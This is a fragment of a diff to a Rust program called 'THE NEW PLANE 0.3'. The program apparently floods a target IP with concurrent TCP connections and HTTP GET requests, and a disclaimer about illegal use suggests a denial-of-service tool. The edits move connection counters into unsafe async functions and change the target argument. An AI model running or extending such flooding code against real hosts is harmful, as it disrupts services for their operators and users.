@@ -29,7 +29,7 @@ async fn main() -> Result<(), io::Error> {
     if opc == "-h" || opc == "--help" || opc == "/?" {
         println!("{}
 THE NEW PLANE 0.3
-Usage: ./thenewplane [options] URL
+Usage: ./thenewplane [options] IP
 
 Options:
     -V, --version     Show the version of the program
@@ -58,8 +58,6 @@ used for illegal activities.
                 unsafe {
                     async move {
                         mantendo_conexao(copia_arg2).await.unwrap();
-                        CONTADOR += 1; 
-                        println!("{}° Open connection", CONTADOR); 
                     }
                 }
             );
@@ -76,8 +74,6 @@ used for illegal activities.
                 unsafe {
                     async move {
                         requisicoes_get(copia_arg2).await.unwrap();
-                        CONTADOR += 1; 
-                        println!("{}° Request", CONTADOR); 
                     }
                 }
             );
@@ -91,7 +87,7 @@ used for illegal activities.
     Ok(())
 }
 
-async fn mantendo_conexao(ip:String) -> Result<(), io::Error>{
+async unsafe fn mantendo_conexao(ip:String) -> Result<(), io::Error>{
     let mut transmissao = TcpStream::connect(format!("{}",ip)).await?;
 
     let requisicao = format!(
@@ -99,12 +95,18 @@ async fn mantendo_conexao(ip:String) -> Result<(), io::Error>{
     
     transmissao.write_all(requisicao.as_bytes()).await?;
 
+    CONTADOR += 1; 
+    println!("{}° Open connection", CONTADOR); 
+
     Ok(())
 }
 
-async fn requisicoes_get(url:String) -> Result<(), io::Error>{
-    let req = reqwest::get(format!("{}",url)).await;
+async unsafe fn requisicoes_get(url:String) -> Result<(), io::Error>{
+    let req = reqwest::get(format!("http://{}",url)).await;
     drop(req);
     
+    CONTADOR += 1; 
+    println!("{}° Request", CONTADOR);
+
     Ok(())
 }
